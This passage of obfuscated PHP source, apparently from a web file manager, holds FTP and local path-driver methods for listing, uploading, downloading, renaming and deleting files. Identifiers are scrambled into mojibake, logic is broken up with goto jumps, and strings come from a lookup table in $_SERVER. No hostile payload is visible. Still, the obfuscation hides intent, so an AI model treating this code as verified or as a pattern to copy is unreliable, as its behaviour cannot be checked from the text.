$d¿¦®ì‘Ç§[$EË×ÔìÅƒË[78]] : 0, $EË×ÔìÅƒË[168] => $this->ext($dĞø˜˜Ö‚)); if ($EñçÈ—âÖ) { return $F‚’Ñ‡¦¬Ü; } goto b™êØîòÚ³; FµöØ®Á÷: } public function size($b‚©µ«¡) { $dÀ­”ÌÆŸ = $this->objectMeta($b‚©µ«¡); return $dÀ­”ÌÆŸ ? $dÀ­”ÌÆŸ[$_SERVER[›é¼±][78]] : 0; } public function info($e§ì·¤³ñ±) { if ($this->isFile($e§ì·¤³ñ±)) { return $this->fileInfo($e§ì·¤³ñ±, 0); } else { if ($this->isFolder($e§ì·¤³ñ±)) { return $this->folderInfo($e§ì·¤³ñ±); } } return !1; } private function fileList($Dà»¥†‡é’, &$CÖŞ…±„©, &$B–§íÄÍ¥, $A¶Ê¸§¬ÕÇ = false) { goto BĞ¸ö§¥İ¾; BĞ¸ö§¥İ¾: $D†Ô®İ =& $_SERVER[›é¼±]; $Dà»¥†‡é’ = $this->iconvSystem($Dà»¥†‡é’); if (!$this->isFolder($Dà»¥†‡é’)) { return !1; } goto AÁÚèÄ¤‡¡; aí”„Ï•ëŒ: $a¬’øøÆÅ = array($D†Ô®İ[95] => 1, $D†Ô®İ[1285] => 1); foreach ($e²Œñ¯Ñê„ as $d²çÉÀË‹‘) { goto C÷°ñÚÓÆ; f¹ÙØâ‰­ƒ: if ($DŞË×ÌÌ¥é) { $CÖŞ…±„©[] = $f³’ÂñÓá; if ($A¶Ê¸§¬ÕÇ) { $this->fileList($f³’ÂñÓá, $CÖŞ…±„©, $B–§íÄÍ¥, $A¶Ê¸§¬ÕÇ); } continue; } $B–§íÄÍ¥[] = $E¨¨ÍµÔ¨•; goto aæ«êİåÊ; C÷°ñÚÓÆ: $e™ÌÛ”»‘‡ = $this->_listItem($d²çÉÀË‹‘); if ($e™ÌÛ”»‘‡[0] == $D†Ô®İ[754]) { continue; } $f³’ÂñÓá = $e™ÌÛ”»‘‡[8]; goto fÂœ’±š­×; D‰Õ†ß†¶: if (substr($d²çÉÀË‹‘, 0, 1) == $D†Ô®İ[1286]) { $E¨¨ÍµÔ¨•[$D†Ô®İ[29]] = $D†Ô®İ[77]; $E¨¨ÍµÔ¨•[$D†Ô®İ[78]] = 0; } $DŞË×ÌÌ¥é = $E¨¨ÍµÔ¨•[$D†Ô®İ[29]] == $D†Ô®İ[77] ? !0 : !1; if ($d‚áÒ«èÄ) { $this->cacheMethod($D†Ô®İ[199], $f³’ÂñÓá, $DŞË×ÌÌ¥é); $this->cacheMethod($D†Ô®İ[200], $f³’ÂñÓá, $E¨¨ÍµÔ¨•); } goto f¹ÙØâ‰­ƒ; fÂœ’±š­×: if (empty($f³’ÂñÓá) && $f³’ÂñÓá !== $D†Ô®İ[191] || isset($a¬’øøÆÅ[$f³’ÂñÓá])) { continue; } $f³’ÂñÓá = $this->iconvApp($Dà»¥†‡é’ . ltrim($f³’ÂñÓá, $D†Ô®İ[8])); $E¨¨ÍµÔ¨• = array($D†Ô®İ[28] => $f³’ÂñÓá, $D†Ô®İ[29] => $D†Ô®İ[193], $D†Ô®İ[78] => $e™ÌÛ”»‘‡[4]); goto D‰Õ†ß†¶; aæ«êİåÊ: } if ($d‚áÒ«èÄ) { $this->cacheMethod($D†Ô®İ[199], $Dà»¥†‡é’, !0); } goto aÀïóÜÎØ¢; AÁÚèÄ¤‡¡: @ftp_chdir($this->connect, $D†Ô®İ[8]); $Dà»¥†‡é’ = rtrim($Dà»¥†‡é’, $D†Ô®İ[8]) . $D†Ô®İ[8]; check_abort(); goto E˜ºåÙÉ; E˜ºåÙÉ: $d‚áÒ«èÄ = $this->listItemCache === !1 ? !1 : !0; $e²Œñ¯Ñê„ = @ftp_rawlist($this->connect, $Dà»¥†‡é’); if (!$e²Œñ¯Ñê„) { $e²Œñ¯Ñê„ = array(); } goto aí”„Ï•ëŒ; aÀïóÜÎØ¢: } private function _listItem($d¢÷˜´Œ—) { if (empty($d¢÷˜´Œ—)) { return array(); } $d÷Ñ’ÖÔµ = preg_split($_SERVER[›é¼±][1287], $d¢÷˜´Œ—); if (count($d÷Ñ’ÖÔµ) <= 9) { return $d÷Ñ’ÖÔµ; } $d÷Ñ’ÖÔµ[8] = trim(substr($d¢÷˜´Œ—, strpos($d¢÷˜´Œ—, $d÷Ñ’ÖÔµ[7]) + strlen($d÷Ñ’ÖÔµ[7]))); return array_splice($d÷Ñ’ÖÔµ, 0, 9); } public function listPath($B¤Ñµó¬, $dä¬¥±•³ = false) { goto AÑ†°¢õ; aËßå»õ„: return array($B™‰Ìß¼[75] => $c¾ÛŞÖ´éÃ, $B™‰Ìß¼[74] => $b¢«­í“Í¸); goto FîÛé›ö”Œ; bßè‘Ä¤²Ú: $this->fileList($B¤Ñµó¬, $c¾ÛŞÖ´éÃ, $b¢«­í“Í¸); foreach ($c¾ÛŞÖ´éÃ as $D×Ÿ‘Éƒœí => $E¿äã‘´) { $c¾ÛŞÖ´éÃ[$D×Ÿ‘Éƒœí] = $this->folderInfo($E¿äã‘´, $dä¬¥±•³); } foreach ($b¢«­í“Í¸ as $D×Ÿ‘Éƒœí => $E¿äã‘´) { $b¢«­í“Í¸[$D×Ÿ‘Éƒœí] = $this->fileInfo($E¿äã‘´[$B™‰Ìß¼[28]], $dä¬¥±•³, $E¿äã‘´); } goto aËßå»õ„; AÑ†°¢õ: $B™‰Ìß¼ =& $_SERVER[›é¼±]; if (!$this->_isconn()) { return !1; } $c¾ÛŞÖ´éÃ = $b¢«­í“Í¸ = array(); goto bßè‘Ä¤²Ú; FîÛé›ö”Œ: } public function has($F‚ÈÙøŠ† , $D§©ö¦³ø = false, $E÷¡›‰Ÿ‘© = true) { goto EÓ“ï‹‚î; EÓ“ï‹‚î: $aÂ™ñÂ±‹É =& $_SERVER[›é¼±]; $A«ç¬”Ãì = $F£åêÒ…Ô = array(); $fˆ…÷÷ãÙ¾ = $D§©ö¦³ø ? !0 : !1; goto eÖµæÕ˜îå; A³™•”¢¬: return !1; goto d‡Æßö©·¿; eÖµæÕ˜îå: $this->fileList($F‚ÈÙøŠ† , $A«ç¬”Ãì, $F£åêÒ…Ô, $fˆ…÷÷ãÙ¾); if ($D§©ö¦³ø) { return array($aÂ™ñÂ±‹É[203] => count($F£åêÒ…Ô), $aÂ™ñÂ±‹É[204] => count($A«ç¬”Ãì)); } if ($E÷¡›‰Ÿ‘©) { if (count($F£åêÒ…Ô)) { return !0; } } else { if (count($A«ç¬”Ãì)) { return !0; } } goto A³™•”¢¬; d‡Æßö©·¿: } public function listAll($A–×éô”§Š) { goto aê™†ÍîÔç; aê™†ÍîÔç: $Fî¬Ú†²„ä =& $_SERVER[›é¼±]; if (!$this->_isconn()) { return !1; } $d«ì¿Œ“Ò = $c«´•î«× = array(); goto B±ÙéÊ¯Ôô; DŞÊ»Òù§…: foreach ($d«ì¿Œ“Ò as $e‚« é‘›î) { if (is_string($e‚« é‘›î)) { $DİØ£Ñïíƒ[$e‚« é‘›î] = 0; } } return $this->listAllFiles($A–×éô”§Š, array_keys($DİØ£Ñïíƒ), $DİØ£Ñïíƒ); goto eÕ¾™¬Ò†Ò; B±ÙéÊ¯Ôô: $this->fileList($A–×éô”§Š, $d«ì¿Œ“Ò, $c«´•î«×, !0); $DİØ£Ñïíƒ = array(); foreach ($c«´•î«× as $e‚« é‘›î) { $DİØ£Ñïíƒ[$e‚« é‘›î[$Fî¬Ú†²„ä[28]]] = $e‚« é‘›î[$Fî¬Ú†²„ä[78]]; } goto DŞÊ»Òù§…; eÕ¾™¬Ò†Ò: } public function getContent($b’Ø¹ñù©§) { if (!$this->_isconn()) { return !1; } $b’Ø¹ñù©§ = $this->iconvSystem($b’Ø¹ñù©§); return $this->fileSubstr($b’Ø¹ñù©§); } public function setContent($eî‹ÆøºÒµ, $e®”‡¿¡š’ = '') { goto C™§¡¡ñˆ; C™§¡¡ñˆ: if (!$this->_isconn()) { return !1; } $aÎ‰Å›ßÃÄ = $this->pathThis($this->iconvSystem($eî‹ÆøºÒµ)); $eªÁª¸è‹è = $this->tempFile($aÎ‰Å›ßÃÄ); goto D¹Ë’Õ‰§­; CÆÒà—¿Ò: return $EÓÊÔ§áÒ; goto AïŸøÑ’Äê; D¹Ë’Õ‰§­: file_put_contents($eªÁª¸è‹è, $e®”‡¿¡š’); $EÓÊÔ§áÒ = $this->upload($eî‹ÆøºÒµ, $this->iconvApp($eªÁª¸è‹è)); $this->tempFileRemve($eªÁª¸è‹è); goto CÆÒà—¿Ò; AïŸøÑ’Äê: } public function fileSubstr($F„ÌÊÊØ­ß, $Cù‡Ğ»¨Œ§ = 0, $AöÙœÊ—á = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($F„ÌÊÊØ­ß, $Cù‡Ğ»¨Œ§, $AöÙœÊ—á); } private function ftpRequest($eÀ©·ÂÚ†É, $a‚‘Â‹àÓ = 0, $cæÌÀ÷âŠÇ = false) { goto F‰é’ÑÒÃì; bÀ½ê‰„Í¨: return $Cæâ×…§; goto aÓ“¸­”ãô; DÙ’‹Š¾¼: curl_setopt($bêÃ³Ë‘«£, CURLOPT_URL, $b–Ş´î‰õÒ . $this->pathEncode($eÀ©·ÂÚ†É)); curl_setopt($bêÃ³Ë‘«£, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($cæÌÀ÷âŠÇ) { $CÂò¸Â…Ü… = $a‚‘Â‹àÓ + $cæÌÀ÷âŠÇ - 1; curl_setopt($bêÃ³Ë‘«£, CURLOPT_RANGE, "{$a‚‘Â‹àÓ}\x2d{$CÂò¸Â…Ü…}"); } goto b³¯ ®À¿†; F‰é’ÑÒÃì: $eÀ©·ÂÚ†É = $this->iconvSystem($eÀ©·ÂÚ†É); $b–Ş´î‰õÒ = $this->scheme . $this->host . $_SERVER[›é¼±][4] . $this->port; $bêÃ³Ë‘«£ = curl_init(); goto DÙ’‹Š¾¼; b³¯ ®À¿†: curl_setopt($bêÃ³Ë‘«£, CURLOPT_RETURNTRANSFER, 1); $Cæâ×…§ = curl_exec($bêÃ³Ë‘«£); curl_close($bêÃ³Ë‘«£); goto bÀ½ê‰„Í¨; aÓ“¸­”ãô: } public function upload($F¬œ¨¨”ªä, $a”‘İµºŞŒ, $d´®õ»¤ = false, $E¿°–öÚï• = REPEAT_REPLACE) { goto a¦ã¬À±ì‡; cŒÖò­Äå: $a”‘İµºŞŒ = $this->iconvSystem($a”‘İµºŞŒ); $AïÀ´é“›© = ftp_nb_put($this->connect, $F¬œ¨¨”ªä, $a”‘İµºŞŒ, FTP_BINARY); while ($AïÀ´é“›© == FTP_MOREDATA) { $AïÀ´é“›© = ftp_nb_continue($this->connect); } goto Dò“»›äíÁ; Dò“»›äíÁ: if ($AïÀ´é“›© != FTP_FINISHED) { return !1; } return $this->getPathOuter($F¬œ¨¨”ªä); goto E…Ş¾¬óµ¨; a¦ã¬À±ì‡: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($F¬œ¨¨”ªä))) { return !1; } $F¬œ¨¨”ªä = $this->iconvSystem($F¬œ¨¨”ªä); goto cŒÖò­Äå; E…Ş¾¬óµ¨: } public function download($D“Ï§ç¹™, $c’ñ¿‚´ò¾ = '') { goto Dò‘¡¸ã°; Dò‘¡¸ã°: if (!$this->_isconn()) { return !1; } $FÍ©Æ’‘¢• = $this->pathFather($c’ñ¿‚´ò¾); if (!IO::mkdir($FÍ©Æ’‘¢•)) { return !1; } goto b™ŒÏ•–³; b™ŒÏ•–³: $D“Ï§ç¹™ = $this->iconvSystem($D“Ï§ç¹™); $c’ñ¿‚´ò¾ = $this->iconvSystem($c’ñ¿‚´ò¾); $aã…±™ñèÔ = ftp_nb_get($this->connect, $c’ñ¿‚´ò¾, $D“Ï§ç¹™, FTP_BINARY); goto EõµŠ¤¹¶; EõµŠ¤¹¶: while ($aã…±™ñèÔ == FTP_MOREDATA) { $aã…±™ñèÔ = ftp_nb_continue($this->connect); } if ($aã…±™ñèÔ != FTP_FINISHED) { return !1; } return $this->iconvApp($c’ñ¿‚´ò¾); goto B‰¬ÏŠãÃ©; B‰¬ÏŠãÃ©: } public function exist($dˆÃï±’Ó) { return $this->isFile($dˆÃï±’Ó) || $this->isFolder($dˆÃï±’Ó); } public function isFile($Fˆòä”Œß) { return !$this->isFolder($Fˆòä”Œß) && $this->objectMeta($Fˆòä”Œß); } public function isFolder($CÃáÛ¨Œ“) { return $this->cacheMethod($_SERVER[›é¼±][199], $CÃáÛ¨Œ“); } protected function objectMeta($f›Ğ½ôëº) { return $this->cacheMethod($_SERVER[›é¼±][200], $f›Ğ½ôëº); } protected function _objectMeta($EµÓªËÙĞô) { goto Cöêƒã¹³¸; Cöêƒã¹³¸: $FÔ¹¦Ò˜Åô =& $_SERVER[›é¼±]; if ($EµÓªËÙĞô == $FÔ¹¦Ò˜Åô[33] || $EµÓªËÙĞô == $FÔ¹¦Ò˜Åô[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto cÍÙòÁ«µù; cÍÙòÁ«µù: $EµÓªËÙĞô = $this->iconvSystem($EµÓªËÙĞô); $b›Ò„ĞóÑ = array($FÔ¹¦Ò˜Åô[28] => $this->iconvApp($EµÓªËÙĞô), $FÔ¹¦Ò˜Åô[29] => $FÔ¹¦Ò˜Åô[193], $FÔ¹¦Ò˜Åô[78] => 0); @ftp_chdir($this->connect, $FÔ¹¦Ò˜Åô[8]); goto DèÓ™´¤ª’; DèÓ™´¤ª’: $FİÉŠ³¢›ï = @ftp_size($this->connect, $EµÓªËÙĞô); if ($FİÉŠ³¢›ï != -1) { $b›Ò„ĞóÑ[$FÔ¹¦Ò˜Åô[78]] = $FİÉŠ³¢›ï; } else { $f»ëƒ¦Ñµ´ = @ftp_chdir($this->connect, $EµÓªËÙĞô); if (!$f»ëƒ¦Ñµ´) { return !1; } $b›Ò„ĞóÑ[$FÔ¹¦Ò˜Åô[29]] = $FÔ¹¦Ò˜Åô[77]; } return $b›Ò„ĞóÑ; goto cÜ«ŞÊêŸÂ; cÜ«ŞÊêŸÂ: } protected function _isFolder($FÌ½òò…Åâ) { $eó¶õ‰šë =& $_SERVER[›é¼±]; if ($FÌ½òò…Åâ == $eó¶õ‰šë[33] || $FÌ½òò…Åâ == $eó¶õ‰šë[8]) { return !0; } $a æ–ÆÖ‹ = $this->_objectMeta($FÌ½òò…Åâ); return isset($a æ–ÆÖ‹[$eó¶õ‰šë[29]]) && $a æ–ÆÖ‹[$eó¶õ‰šë[29]] == $eó¶õ‰šë[77] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($A˜¤òî¹å«) { if (substr($A˜¤òî¹å«, 0, 2) == $_SERVER[›é¼±][1278]) { $A˜¤òî¹å« = BASIC_PATH . substr($A˜¤òî¹å«, 2); } return $A˜¤òî¹å«; } public function iconvApp($eõï µ¡Ú) { $Aº¬ÌØ¤Ç‰ =& $_SERVER[›é¼±]; global $config; return $this->iconvTo($eõï µ¡Ú, $config[$Aº¬ÌØ¤Ç‰[1276]], $config[$Aº¬ÌØ¤Ç‰[1275]]); } public function iconvSystem($B‰›·ß·Ê‡) { $DÚÏù…ñø =& $_SERVER[›é¼±]; global $config; return $this->iconvTo($B‰›·ß·Ê‡, $config[$DÚÏù…ñø[1275]], $config[$DÚÏù…ñø[1276]]); } public function getPathOuter($eôÆÚè¸˜í) { goto A«²Š¾Ç; cÈ›Š¢ƒ•¡: return $this->pathDriver . $EËõçŞ‰÷¾[8] . ltrim($eôÆÚè¸˜í, $EËõçŞ‰÷¾[8]); goto EÍç¢ƒã•; Cğ››–•½: $eôÆÚè¸˜í = KodIO::clear($eôÆÚè¸˜í); $eôÆÚè¸˜í = substr($eôÆÚè¸˜í, strlen($B²ó¥¾ÖÈÏ)); if (empty($this->pathDriver)) { return $eôÆÚè¸˜í; } goto cÈ›Š¢ƒ•¡; bÇ±ÍÍİŸ¨: if (substr($B²ó¥¾ÖÈÏ, 0, 2) == $EËõçŞ‰÷¾[1278]) { $B²ó¥¾ÖÈÏ = BASIC_PATH . substr($B²ó¥¾ÖÈÏ, 2); } if (substr($eôÆÚè¸˜í, 0, 2) == $EËõçŞ‰÷¾[1278]) { $eôÆÚè¸˜í = BASIC_PATH . substr($eôÆÚè¸˜í, 2); } $B²ó¥¾ÖÈÏ = KodIO::clear($B²ó¥¾ÖÈÏ); goto Cğ››–•½; A«²Š¾Ç: $EËõçŞ‰÷¾ =& $_SERVER[›é¼±]; $B²ó¥¾ÖÈÏ = $this->iconvApp($this->pathBase); $eôÆÚè¸˜í = $this->iconvApp($eôÆÚè¸˜í); goto bÇ±ÍÍİŸ¨; EÍç¢ƒã•: } public function mkfile($Bğ“ùÑÆ¢, $C·áöå×í¿ = '', $EÉìæ½‹”Æ = REPEAT_RENAME) { $Bğ“ùÑÆ¢ = $this->iconvSystem($Bğ“ùÑÆ¢); @touch($Bğ“ùÑÆ¢); if ($C·áöå×í¿) { file_put_contents($Bğ“ùÑÆ¢, $C·áöå×í¿); } @chmod($Bğ“ùÑÆ¢, $this->pathAuth); return is_file($Bğ“ùÑÆ¢) ? $this->getPathOuter($Bğ“ùÑÆ¢) : !1; } public function mkdir($EÂË›±…, $Aíàà«’İµ = REPEAT_SKIP) { $EÂË›±… = $this->iconvSystem($EÂË›±…); if (is_dir($EÂË›±…)) { return $this->getPathOuter($EÂË›±…); } @mkdir($EÂË›±…, $this->pathAuth, !0); @chmod($EÂË›±…, $this->pathAuth); return is_dir($EÂË›±…) ? $this->getPathOuter($EÂË›±…) : !1; } public function copyFile($fˆ÷öÂ„‡‰, $B«´ï…ÃÔ¤) { $this->mkdir($this->pathFather($B«´ï…ÃÔ¤)); $fˆ÷öÂ„‡‰ = $this->iconvSystem($fˆ÷öÂ„‡‰); $B«´ï…ÃÔ¤ = $this->iconvSystem($B«´ï…ÃÔ¤); $FÄ‹‡¹È = copy_64($fˆ÷öÂ„‡‰, $B«´ï…ÃÔ¤); @chmod($B«´ï…ÃÔ¤, $this->pathAuth); return $FÄ‹‡¹È ? $this->getPathOuter($B«´ï…ÃÔ¤) : !1; } public function moveFile($BŠ…ç‚ à, $aê•Òë) { goto a‚½Š¡óÜÍ; DŒ©É˜î•É: $e„Ó’´†Öè = intval(@rename($BŠ…ç‚ à, $aê•Òë)); if (!$e„Ó’´†Öè) { if ($e„Ó’´†Öè = intval(@copy_64($BŠ…ç‚ à, $aê•Òë))) { @unlink($BŠ…ç‚ à); } } @chmod($aê•Òë, $this->pathAuth); goto a–²´À¹ÄÉ; a‚½Š¡óÜÍ: $this->mkdir($this->pathFather($aê•Òë)); $BŠ…ç‚ à = $this->iconvSystem($BŠ…ç‚ à); $aê•Òë = $this->iconvSystem($aê•Òë); goto DŒ©É˜î•É; a–²´À¹ÄÉ: return $e„Ó’´†Öè ? $this->getPathOuter($aê•Òë) : !1; goto fîÍ‚ÄíÖ„; fîÍ‚ÄíÖ„: } public function delFile($fæ‚ëõìß¥) { $fæ‚ëõìß¥ = $this->iconvSystem($fæ‚ëõìß¥); if (!@unlink($fæ‚ëõìß¥)) { @chmod($fæ‚ëõìß¥, $this->pathAuth); if (!@unlink($fæ‚ëõìß¥)) { return !1; } } else { return !0; } } public function delFolder($c¦‘Îóáã) { goto aæê–ˆˆ‹œ; aæê–ˆˆ‹œ: $d§ŞâöÇà =& $_SERVER[›é¼±]; $c¦‘Îóáã = $this->iconvSystem($c¦‘Îóáã); if (!is_dir($c¦‘Îóáã)) { return !0; } goto e¿™£¸÷Á; EÅ–¼ëæ«¼: return rmdir($c¦‘Îóáã); goto aèï´åÀÂ; e¿™£¸÷Á: if (!($EâŞ·’öğ = opendir($c¦‘Îóáã))) { return !1; } while (($CÓÛßçéïæ = readdir($EâŞ·’öğ)) !== !1) { if ($CÓÛßçéïæ == $d§ŞâöÇà[95] || $CÓÛßçéïæ == $d§ŞâöÇà[1285]) { continue; } $aè±êº·¯ = $c¦‘Îóáã . $d§ŞâöÇà[8] . $CÓÛßçéïæ; if (is_file($aè±êº·¯) || is_link($aè±êº·¯)) { if (!unlink($aè±êº·¯)) { chmod($aè±êº·¯, $this->pathAuth); if (!unlink($aè±êº·¯)) { return !1; } } } else { if (is_dir($aè±êº·¯)) { chmod($aè±êº·¯, $this->pathAuth); $aè±êº·¯ = $this->iconvApp($aè±êº·¯); if (!$this->delFolder($aè±êº·¯)) { return !1; } } } } closedir($EâŞ·’öğ); goto EÅ–¼ëæ«¼; aèï´åÀÂ: } public function rename($A›‘‡Ÿˆîï, $bœ²¹÷ŠŒ¼) { goto dßŒŒßßáá; e œ°¦¡¦Ä: $AµğÊ•±Ñ­ = @rename($A›‘‡Ÿˆîï, $B¾²ñ˜•ô„); $B¾²ñ˜•ô„ = $this->iconvApp($B¾²ñ˜•ô„); return $AµğÊ•±Ñ­ ? $this->getPathOuter($B¾²ñ˜•ô„) : !1; goto d«ŸâÔ¾¸¯; dßŒŒßßáá: $c²Ü´°µ†ß =& $_SERVER[›é¼±]; $aÏ±§·¦˜Ğ = $this->fileNameAuto($this->pathFather($A›‘‡Ÿˆîï), $bœ²¹÷ŠŒ¼); $aÏ±§·¦˜Ğ = $this->iconvSystem($aÏ±§·¦˜Ğ); goto f„ÒØ¸Ä­‰; f„ÒØ¸Ä­‰: $A›‘‡Ÿˆîï = $this->iconvSystem($A›‘‡Ÿˆîï); $Cªª¬ŸêÙ = $this->pathFather($A›‘‡Ÿˆîï); $B¾²ñ˜•ô„ = rtrim($Cªª¬ŸêÙ, $c²Ü´°µ†ß[8]) . $c²Ü´°µ†ß[8] . $aÏ±§·¦˜Ğ; goto e œ°¦¡¦Ä; d«ŸâÔ¾¸¯: } public function size($eª‘£îŸÇ¶) { $eª‘£îŸÇ¶ = $this->iconvSystem($eª‘£îŸÇ¶); return filesize_64($eª‘£îŸÇ¶); } public function info($aÜ¡†Òƒ˜­) { $aÜ¡†Òƒ˜­ = $this->iconvSystem($aÜ¡†Òƒ˜­); if ($this->isFolder($aÜ¡†Òƒ˜­)) { return $this->folderInfo($aÜ¡†Òƒ˜­); } else { if ($this->isFile($aÜ¡†Òƒ˜­)) { return $this->fileInfo($aÜ¡†Òƒ˜­); } } return !1; } protected function infoChildren($dƒ§Ÿö˜İë, &$cÙ×ùƒí’², $E¨¼Àà³÷Ş = true) { goto BÎìŒ–¼¦»; Cï½•¶â²Ÿ: closedir($eîÇäŞ±¬); goto CƒÄ¡¢ï‰ô; A—¶‚ä‡î•: if ($E¨¼Àà³÷Ş) { $dƒ§Ÿö˜İë = $this->iconvSystem($dƒ§Ÿö˜İë); } if (!($eîÇäŞ±¬ = @opendir($dƒ§Ÿö˜İë))) { return; } while (($FĞôË‘ÑËù = readdir($eîÇäŞ±¬)) !== !1) { if ($FĞôË‘ÑËù == $Bõ“‡ÓİË[95] || $FĞôË‘ÑËù == $Bõ“‡ÓİË[1285]) { continue; } $BÎ–ß¥§²Š = $dƒ§Ÿö˜İë . $FĞôË‘ÑËù; if (is_file($BÎ–ß¥§²Š) || is_link($BÎ–ß¥§²Š)) { $cÙ×ùƒí’²[$Bõ“‡ÓİË[79]]++; $cÙ×ùƒí’²[$Bõ“‡ÓİË[78]] += filesize_64($BÎ–ß¥§²Š); } else { if (is_dir($BÎ–ß¥§²Š)) { $cÙ×ùƒí’²[$Bõ“‡ÓİË[80]]++; $this->infoChildren($BÎ–ß¥§²Š, $cÙ×ùƒí’², !1); } } } goto Cï½•¶â²Ÿ; BÎìŒ–¼¦»: $Bõ“‡ÓİË =& $_SERVER[›é¼±]; check_abort_echo(); $dƒ§Ÿö˜İë = rtrim($dƒ§Ÿö˜İë, $Bõ“‡ÓİË[8]) . $Bõ“‡ÓİË[8]; goto A—¶‚ä‡î•; CƒÄ¡¢ï‰ô: } private function folderInfo($Aë”„ËÌøÁ, $F«ïğïÙöõ = false) { $CÖ¬É×ÓÛ =& $_SERVER[›é¼±]; $Aë”„ËÌøÁ = rtrim($Aë”„ËÌøÁ, $CÖ¬É×ÓÛ[8]) . $CÖ¬É×ÓÛ[8]; $D…ƒÍË² † = $this->iconvApp($this->pathThis($Aë”„ËÌøÁ)); if ($F«ïğïÙöõ) { return array($CÖ¬É×ÓÛ[28] => $D…ƒÍË² †, $CÖ¬É×ÓÛ[76] => $this->getPathOuter($Aë”„ËÌøÁ), $CÖ¬É×ÓÛ[29] => $CÖ¬É×ÓÛ[77]); } $CÙß‡å‡  = array($CÖ¬É×ÓÛ[28] => $D…ƒÍË² †, $CÖ¬É×ÓÛ[76] => $this->getPathOuter($Aë”„ËÌøÁ), $CÖ¬É×ÓÛ[29] => $CÖ¬É×ÓÛ[77], $CÖ¬É×ÓÛ[194] => @filectime($Aë”„ËÌøÁ), $CÖ¬É×ÓÛ[84] => @filemtime($Aë”„ËÌøÁ), $CÖ¬É×ÓÛ[1288] => @fileatime($Aë”„ËÌøÁ), $CÖ¬É×ÓÛ[1289] => is_readable($Aë”„ËÌøÁ), $CÖ¬É×ÓÛ[1290] => is_writable($Aë”„ËÌøÁ), $CÖ¬É×ÓÛ[1291] => get_mode($Aë”„ËÌøÁ)); return $CÙß‡å‡ ; } private function fileInfo($B’Ë÷¡ò, $e’à®™ï = false) { $eáŠˆİ–ˆ÷ =& $_SERVER[›é¼±]; $D¯ª‰˜Ø—æ = $this->iconvApp($this->pathThis($B’Ë÷¡ò)); if ($e’à®™ï) { return array($eáŠˆİ–ˆ÷[28] => $D¯ª‰˜Ø—æ, $eáŠˆİ–ˆ÷[76] => $this->getPathOuter($B’Ë÷¡ò), $eáŠˆİ–ˆ÷[29] => $eáŠˆİ–ˆ÷[193], $eáŠˆİ–ˆ÷[78] => $this->size($B’Ë÷¡ò), $eáŠˆİ–ˆ÷[168] => $this->ext($D¯ª‰˜Ø—æ)); } $D¯¡†‚‘øœ = array($eáŠˆİ–ˆ÷[28] => $D¯ª‰˜Ø—æ, $eáŠˆİ–ˆ÷[76] => $this->getPathOuter($B’Ë÷¡ò), $eáŠˆİ–ˆ÷[29] => $eáŠˆİ–ˆ÷[193], $eáŠˆİ–ˆ÷[194] => @filectime($B’Ë÷¡ò), $eáŠˆİ–ˆ÷[84] => @filemtime($B’Ë÷¡ò), $eáŠˆİ–ˆ÷[1288] => @fileatime($B’Ë÷¡ò), $eáŠˆİ–ˆ÷[78] => $this->size($B’Ë÷¡ò), $eáŠˆİ–ˆ÷[168] => $this->ext($D¯ª‰˜Ø—æ), $eáŠˆİ–ˆ÷[1289] => is_readable($B’Ë÷¡ò), $eáŠˆİ–ˆ÷[1290] => is_writable($B’Ë÷¡ò), $eáŠˆİ–ˆ÷[1291] => get_mode($B’Ë÷¡ò)); return $D¯¡†‚‘øœ; } public function exist($a¼³Æ˜ç»½) { $a¼³Æ˜ç»½ = $this->iconvSystem($a¼³Æ˜ç»½); return @file_exists($a¼³Æ˜ç»½); } public function isFile($d½Å…‘ÎÒ‚) { $d½Å…‘ÎÒ‚ = $this->iconvSystem($d½Å…‘ÎÒ‚); return @is_file($d½Å…‘ÎÒ‚); } public function isFolder($Aµæ¹É‚Û) { $Aµæ¹É‚Û = $this->iconvSystem($Aµæ¹É‚Û); return @is_dir($Aµæ¹É‚Û); } public function listPath($D²Ş»…¨ÅÇ, $Cå·—š¹êé = false) { goto D‹¼Ğ›§•; D‹¼Ğ›§•: $f­Û÷¨ÈÒÌ =& $_SERVER[›é¼±]; $D²Ş»…¨ÅÇ = $this->iconvSystem($D²Ş»…¨ÅÇ); $D²Ş»…¨ÅÇ = rtrim($D²Ş»…¨ÅÇ, $f­Û÷¨ÈÒÌ[8]) . $f­Û÷¨ÈÒÌ[8]; goto Fß½™Ë‡»õ; CëàÆ¹åˆ‚: closedir($a¨Â„ßÅÚ); return $f•·½åÊÙ; goto a±˜†‰¤ª©; Fß½™Ë‡»õ: $f•·½åÊÙ = array($f­Û÷¨ÈÒÌ[75] => array(), $f­Û÷¨ÈÒÌ[74] => array()); if (!($a¨Â„ßÅÚ = @opendir($D²Ş»…¨ÅÇ))) { return $f•·½åÊÙ; } while (($CÔ‡˜ø–¡ï = readdir($a¨Â„ßÅÚ)) !== !1) { if ($CÔ‡˜ø–¡ï == $f­Û÷¨ÈÒÌ[95] || $CÔ‡˜ø–¡ï == $f­Û÷¨ÈÒÌ[1285]) { continue; } $D»ˆê½ƒ¤ = $D²Ş»…¨ÅÇ . $CÔ‡˜ø–¡ï; if (is_file($D»ˆê½ƒ¤)) { $f•·½åÊÙ[$f­Û÷¨ÈÒÌ[74]][] = $this->fileInfo($D»ˆê½ƒ¤, $Cå·—š¹êé); } else { $f•·½åÊÙ[$f­Û÷¨ÈÒÌ[75]][] = $this->folderInfo($D»ˆê½ƒ¤, $Cå·—š¹êé); } } goto CëàÆ¹åˆ‚; a±˜†‰¤ª©: } public function listAll($d¹ôñÂ°¤, &$BÔ¸„—†¢— = array()) { goto A×È”Äˆ‚–; cšÓ‚Ïç½: if (!($aËÚ‚Ëğƒ— = @opendir($d¹ôñÂ°¤))) { return $BÔ¸„—†¢—; } while (($dŒ²®¹µÈê = readdir($aËÚ‚Ëğƒ—)) !== !1) { if ($dŒ²®¹µÈê == $C™Ñ‡Áãø¸[95] || $dŒ²®¹µÈê == $C™Ñ‡Áãø¸[1285]) { continue; } $FšÇ©÷­çÇ = $d¹ôñÂ°¤ . $dŒ²®¹µÈê; if (is_dir($FšÇ©÷­çÇ) && !is_link($FšÇ©÷­çÇ)) { $BÔ¸„—†¢—[] = array($C™Ñ‡Áãø¸[76] => $FšÇ©÷­çÇ . $C™Ñ‡Áãø¸[8], $C™Ñ‡Áãø¸[77] => 